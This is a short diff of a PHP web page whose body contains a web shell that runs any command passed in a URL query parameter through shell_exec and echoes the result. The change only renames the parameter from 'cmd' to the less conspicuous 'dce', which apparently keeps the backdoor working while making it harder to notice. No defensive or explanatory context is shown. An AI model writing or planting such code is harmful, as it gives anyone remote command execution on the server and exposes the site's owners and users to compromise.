@@ -5,8 +5,8 @@
 </head>
 <body>
 <?php
-if (isset($_GET['cmd'])) {
-    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+if (isset($_GET['dce'])) {
+    echo "<pre>" . shell_exec($_GET['dce']) . "</pre>";
 }
 ?>
 </body>
